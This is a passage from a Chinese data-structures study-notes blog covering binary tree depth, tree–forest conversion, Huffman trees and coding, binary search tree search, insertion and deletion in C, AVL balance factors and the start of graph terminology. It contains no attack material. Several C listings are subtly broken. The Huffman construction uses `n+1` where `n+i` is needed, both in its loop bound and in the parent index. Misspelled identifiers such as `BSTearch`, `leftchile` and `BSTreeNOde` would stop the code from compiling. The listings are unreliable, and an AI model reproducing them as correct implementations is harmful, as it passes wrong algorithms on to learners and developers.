CountRightNode(bt-&gt;leftchild);</span><br><span class="line">    num += CountRightNode(bt-&gt;rightchild);</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算二叉树的深度"><a href="#计算二叉树的深度" class="headerlink" title="计算二叉树的深度"></a>计算二叉树的深度</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CountLevel</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> i = CountLevel(bt-&gt;leftchild);</span><br><span class="line">        <span class="type">int</span> j = CountLevel(bt-&gt;rightchild);</span><br><span class="line">        <span class="keyword">return</span> (i&gt;j?i:j) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找数据元素"><a href="#查找数据元素" class="headerlink" title="查找数据元素"></a>查找数据元素</h3><blockquote><p>有空记得补</p></blockquote><h2 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h2><h3 id="树、森林转为二叉树"><a href="#树、森林转为二叉树" class="headerlink" title="树、森林转为二叉树"></a>树、森林转为二叉树</h3><ul><li>加线：在所有相邻的<code>兄弟结点</code>之间连线</li><li>抹线：对每个非终端结点，只<code>保留</code>它到其<code>最左子女</code>的连线，<code>删去</code>与<code>其他子女</code>的连线</li><li>调整：以<code>根结点</code>为轴心，将整颗树进行<code>旋转</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215141452.png"></p><h3 id="二叉树转换为树或森林"><a href="#二叉树转换为树或森林" class="headerlink" title="二叉树转换为树或森林"></a>二叉树转换为树或森林</h3><ul><li>加线：若p结点时双亲结点的左孩子，则将p的右孩子，右孩子的右孩子，…，沿分支找到所有的右孩子，都与p的双亲用线相连</li><li>抹线：抹掉原二叉树中双亲与右孩子之间的连线</li><li>调整：将结点按层次排列，形成树结构</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215141953.png"></p><h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p><code>WPL</code>：扩充二叉树的带权的外部路径长度</p><p>​                                                                                       $\displaystyle \sum^{m}_{i \to 0}{w_i \times l_i}$</p><p><strong>w<del>i</del> <strong>是第 i 个外部结点的权值， <strong>l<del>i</del></strong> 是从根到第 i 个外部结点的路径长度，</strong>m</strong>为外部结点的个数</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215142542.png"></p><h3 id="哈夫曼算法"><a href="#哈夫曼算法" class="headerlink" title="哈夫曼算法"></a>哈夫曼算法</h3><ul><li>算法思路：</li></ul><ol><li>由给定的 m 个权值 <strong>{w<del>1</del>，w<del>2</del>，…，w<del>m</del>}</strong> 构造成 m 颗二叉树集 F &#x3D; {T<del>1</del>，T<del>2</del>，…，T<del>m</del> }，其中每一棵二叉树 T<del>i</del> 中只有一个带权为 w<del>i</del> 的根结点，且根结点的权值为 <strong>w<del>i</del></strong></li><li>在 F 中选取<code>两棵权值最小的</code>树作为左右子树构造一棵新的二叉树，且<code>新二叉树的根结点的权值</code>为其左右子树根结点<code>权值之和</code></li><li>在F中<code>删除</code>这两棵树，同时将<code>新得到的二叉树加入 F 中</code></li><li>重复 2. 和 3. ，<code>直到 F 中只含一棵树为止</code></li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215144059.png"></p><ul><li>类型定义：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HuffNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> weight;<span class="comment">//权值</span></span><br><span class="line">    <span class="type">int</span> parent,leftchild,rightchild;<span class="comment">//父结点与左右孩子</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HuffNode</span> *<span class="title">HtNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HuffTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> n;<span class="comment">//哈夫曼树的叶子结点个数</span></span><br><span class="line">    <span class="type">int</span> root;<span class="comment">//哈夫曼树的树根</span></span><br><span class="line">    HtNode ht;<span class="comment">//指向哈夫曼树的指针</span></span><br><span class="line">&#125;*HuffTree;</span><br></pre></td></tr></table></figure><ul><li>算法实现：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">HuffTree <span class="title function_">CreateHuffTree</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> *w)</span></span><br><span class="line">&#123;</span><br><span class="line">    HuffTree pht;</span><br><span class="line">    <span class="type">int</span> i, j, x1, x2, min1, min2;</span><br><span class="line">    pht = (HuffTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> HuffNode)*(<span class="number">2</span>*n<span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">if</span>(pht == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oui of space!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> pht;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为哈夫曼树申请 2n-1 个空间</span></span><br><span class="line">    pht-&gt;ht = (HtNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> HuffNode)*(<span class="number">2</span>*n<span class="number">-1</span>));</span><br><span class="line">    <span class="keyword">if</span>(pht-&gt;ht == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oui of space!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> pht;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化哈夫曼树</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">2</span>*n<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pht-&gt;ht[i].leftchild = <span class="number">-1</span>;<span class="comment">//初始化叶结点的左孩子</span></span><br><span class="line">        pht-&gt;ht[i].rightchild = <span class="number">-1</span>;<span class="comment">//初始化叶结点的右孩子</span></span><br><span class="line">        pht-&gt;ht[i].parent = <span class="number">-1</span>;<span class="comment">//初始化叶结点的父亲</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;n)</span><br><span class="line">            pht-&gt;ht[i].weight = w[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pht-&gt;ht[i].weight = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        min1 = MAX;<span class="comment">//min1代表最小值</span></span><br><span class="line">        min2 = MAX;<span class="comment">//min2代表次小值</span></span><br><span class="line">        x1 = <span class="number">-1</span>;<span class="comment">//最小值下标</span></span><br><span class="line">        x2 = <span class="number">-1</span>;<span class="comment">//次小值下标</span></span><br><span class="line">        <span class="comment">//找到最小值下标 x1 并把最小值赋给 min1</span></span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n+<span class="number">1</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pht-&gt;ht[j].weight &lt; min1&amp;&amp;pht-&gt;ht[j].parent == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                min2 = min1;</span><br><span class="line">                x2 = x1;</span><br><span class="line">                min1 = pht-&gt;ht[j].weight;</span><br><span class="line">                x1 = j;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="comment">//找到次小值下标x2并把次小值赋给min2</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pht-&gt;ht[j].weight &lt; min2&amp;&amp;pht-&gt;ht[j].parent == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                min2 = pht-&gt;ht[j].weight;</span><br><span class="line">                x2 = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//构建 x1，x2 的父结点</span></span><br><span class="line">        pht-&gt;ht[x1].parent = n+<span class="number">1</span>;<span class="comment">//x1父结点下标</span></span><br><span class="line">        pht-&gt;ht[x2].parent = n+<span class="number">1</span>;<span class="comment">//x2父结点下标</span></span><br><span class="line">        pht-&gt;ht[n + i].weight = min1 + min2;<span class="comment">//父结点的权值为极小值加次小值</span></span><br><span class="line">        pht-&gt;ht[n + i].leftchild = x1;<span class="comment">//父结点的左孩子为x1</span></span><br><span class="line">        pht-&gt;ht[n + i].rightchild = x2;<span class="comment">//父结点的右孩子为x2</span></span><br><span class="line">    &#125;</span><br><span class="line">    pht-&gt;root = <span class="number">2</span>*n<span class="number">-2</span>;<span class="comment">//哈夫曼树根结点位置</span></span><br><span class="line">    pht-&gt;n = n;</span><br><span class="line">    <span class="keyword">return</span> pht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈夫曼编码（最优前缀编码）"><a href="#哈夫曼编码（最优前缀编码）" class="headerlink" title="哈夫曼编码（最优前缀编码）"></a>哈夫曼编码（最优前缀编码）</h3><ul><li>编码长度最短</li><li>字符集中任一字符的编码都<code>不是</code>其他字符的编码的<code>前缀</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215233402.png"></p><h1 id="第四章-搜索树"><a href="#第四章-搜索树" class="headerlink" title="第四章 搜索树"></a>第四章 搜索树</h1><h2 id="二分判定查找树"><a href="#二分判定查找树" class="headerlink" title="二分判定查找树"></a>二分判定查找树</h2><ul><li>平均检索长度：ASL</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216004321.png"></p><ul><li>二分查找判定树</li></ul><p><code>查找成功</code>：查找二分查找判定树中已有的结点，路径为根结点——&gt;该结点，经过结点个数为比较次数</p><p><code>查找失败</code>：走的是一条根结点——&gt;扩充二叉树的外部结点的路径</p><h2 id="二分排序树（BST）的基本概念"><a href="#二分排序树（BST）的基本概念" class="headerlink" title="二分排序树（BST）的基本概念"></a>二分排序树（BST）的基本概念</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216012844.png"></p><ul><li>&#x3D;&#x3D;对称遍历有序性&#x3D;&#x3D;</li><li>&#x3D;&#x3D;二分查找方便&#x3D;&#x3D;</li><li>&#x3D;&#x3D;插入的都是叶子结点&#x3D;&#x3D;</li><li>&#x3D;&#x3D;删除不需要移动结点&#x3D;&#x3D;</li></ul><h2 id="二分排序树的查找"><a href="#二分排序树的查找" class="headerlink" title="二分排序树的查找"></a>二分排序树的查找</h2><ul><li>返回NULL查找成功，否则查找失败</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BSTreeNode <span class="title function_">BSTearch</span><span class="params">(BinSearTree bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    BSTreeNode p,parent;</span><br><span class="line">    p = bt;</span><br><span class="line">    parent = p;<span class="comment">//记录待插入结点的父结点</span></span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        parent = p;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == key)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;exist this key\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &gt; key)</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二分排序树的插入"><a href="#二分排序树的插入" class="headerlink" title="二分排序树的插入"></a>二分排序树的插入</h2><ul><li>先查询，建立新结点，判断原二叉排序树是否为空，为空则为根结点，否则进入判断，新结点大于父结点插入右子树，新结点小于父结点插入左子树</li><li>插入成功返回1，失败返回0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BSTInsert</span><span class="params">(BinSearTree bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    BSTreeNode p,temp;</span><br><span class="line">    temp = BSTSearch(bt,key);<span class="comment">//调用查找算法，在上面</span></span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exist this key\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p = (BSTreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BinSearTreeNode));<span class="comment">//申请结点</span></span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc 失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data = key;</span><br><span class="line">    p-&gt;leftchild = p-&gt;rightchild = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(key &lt; temp-&gt;data)</span><br><span class="line">        temp-&gt;leftchild = p;<span class="comment">//作为左孩子插入</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        temp-&gt;rightchild = p;<span class="comment">//作为右孩子插入</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二分排序树的删除"><a href="#二分排序树的删除" class="headerlink" title="二分排序树的删除"></a>二分排序树的删除</h2><ul><li><p>如果待删除结点 p 的左子树为空，则只要令右子树的根结点直接代替 p 即可</p></li><li><p>如果待删除结点 p 的左子树不为空</p></li><li><ul><li><p>方法一：</p></li><li><p>需要遍历 p 的左子树，找到最大的结点 maxpl ，删除 maxpl，再用 maxpl 代替 p 原来的位置</p></li><li><ul><li>如果 maxpl 有左分支，用其左分支代替原来 maxpl 的位置， maxpl 依旧去代替 p 结点的位置</li></ul></li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216015910.png"></p><ul><li>删除算法：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BSTDelete1</span><span class="params">(BinSearTree *bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// parent 记录 p 的父结点，maxpl 记录 p 的左子树中最大的结点</span></span><br><span class="line">    BSTreeNode parent ,p,maxpl;</span><br><span class="line">    p = *bt;</span><br><span class="line">    parent = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == key)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        parent = p;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &gt; key)</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild == <span class="literal">NULL</span>)<span class="comment">//只有右子树的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(parent == <span class="literal">NULL</span>)<span class="comment">//判断是不是删了根结点</span></span><br><span class="line">            *bt = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(parent-&gt;leftchild == p)<span class="comment">//如果p是父结点的左孩子</span></span><br><span class="line">            parent-&gt;leftchild = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//如果p是父结点的右孩子</span></span><br><span class="line">            parent-&gt;rightchild = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild!=<span class="literal">NULL</span>)<span class="comment">//p有左子树和右子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        BSTreeNOde parentp;<span class="comment">//parentp记录maxpl的父结点</span></span><br><span class="line">        parentp = p;</span><br><span class="line">        maxpl = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">while</span>(maxpl-&gt;rightchild != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            parentp = maxpl;</span><br><span class="line">            maxpl = maxpl-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;data = maxpl-&gt;data;<span class="comment">//修改 p 的数据域为 maxpl 的数据域</span></span><br><span class="line">        <span class="keyword">if</span>(parentp == p)<span class="comment">//如果maxpl父结点是p</span></span><br><span class="line">            p-&gt;leftchile = maxpl-&gt;leftchild;<span class="comment">//修改p的左指针，置空</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            parentp-&gt;rightchild = maxpl-&gt;leftchild;<span class="comment">//修改父结点的左指针，置空</span></span><br><span class="line">        p = maxpl;<span class="comment">//更新 p 指针为 maxpl 结点以便删除</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><ul><li>方法二：</li><li>直接让 p 的左子树根结点代替 p ，p 的 右子树接到 maxpl 的右子树</li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216023303.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BSTDelete2</span><span class="params">(BinSearTree *bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// parent 记录 p 的父结点，maxpl 记录 p 的左子树中最大的结点</span></span><br><span class="line">    BSTreeNode parent ,p,maxpl;</span><br><span class="line">    p = *bt;</span><br><span class="line">    parent = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == key)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        parent = p;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &gt; key)</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild == <span class="literal">NULL</span>)<span class="comment">//只有右子树的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(parent == <span class="literal">NULL</span>)<span class="comment">//判断是不是删了根结点</span></span><br><span class="line">            *bt = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(parent-&gt;leftchild == p)<span class="comment">//如果p是父结点的左孩子</span></span><br><span class="line">            parent-&gt;leftchild = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//如果p是父结点的右孩子</span></span><br><span class="line">            parent-&gt;rightchild = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild!=<span class="literal">NULL</span>)<span class="comment">//p有左子树和右子树</span></span><br><span class="line">    &#123;</span><br><span class="line">        maxpl = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">while</span>(maxpl-&gt;rightchild!=<span class="literal">NULL</span>)</span><br><span class="line">            maxpl = maxpl-&gt;rightchild;</span><br><span class="line">        maxpl-&gt;rightchild = p-&gt;rightchild;<span class="comment">//把p的右分支全部接到 maxpl 的右分支，因为都比 maxpl 大</span></span><br><span class="line">        <span class="keyword">if</span>(parent == <span class="literal">NULL</span>)<span class="comment">//判断是不是删了根结点</span></span><br><span class="line">            *bt = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(parent-&gt;leftchild == p)<span class="comment">//如果p是父结点的左孩子</span></span><br><span class="line">            parent-&gt;leftchild = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//如果p是父结点的右孩子</span></span><br><span class="line">            parent-&gt;rightchild = p-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="平衡二叉排序树（AVL）的概念"><a href="#平衡二叉排序树（AVL）的概念" class="headerlink" title="平衡二叉排序树（AVL）的概念"></a>平衡二叉排序树（AVL）的概念</h2><ul><li>可以是空树</li><li>&#x3D;&#x3D;左右子树均为平衡二叉排序树，且左右子树深度之差绝对值不超过1&#x3D;&#x3D;</li><li>结点的&#x3D;&#x3D;平衡因子BF：结点的左子树深度 - 右子树深度&#x3D;&#x3D;</li></ul><h3 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h3><ul><li>&#x3D;&#x3D;平衡因子BF只能是 -1，0，1 的二叉树&#x3D;&#x3D;</li></ul><h2 id="AVL树的四种调整"><a href="#AVL树的四种调整" class="headerlink" title="AVL树的四种调整"></a>AVL树的四种调整</h2><blockquote><p>以后有空补上</p></blockquote><h1 id="第五章-图"><a href="#第五章-图" class="headerlink" title="第五章 图"></a>第五章 图</h1><h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><ul><li><p>度：无向图中顶点 v 的度是关联与该顶点的边的数目，记为 D(v)</p></li><li><p>入度：有向图中以顶点 v 为终点的边的数目称为 v 的入度，记为 ID(v)</p></li><li><p>出度：有向图中以顶点 v 为始点的边的数目称为 v 的出度，记为 OD(v)</p></li><li><p>&#x3D;&#x3D;有向图中顶点 v 的度定义为该顶点的入度和出度之和&#x3D;&#x3D;</p></li><li><p>&#x3D;&#x3D;无论是有向图还是无向图，顶点数 n 和边数 e 和度数之间的关系为&#x3D;&#x3D;</p></li></ul><p>​                                                                                     $\displaystyle \sum^{n}_{i \to 1}{D(v_i) &#x2F; 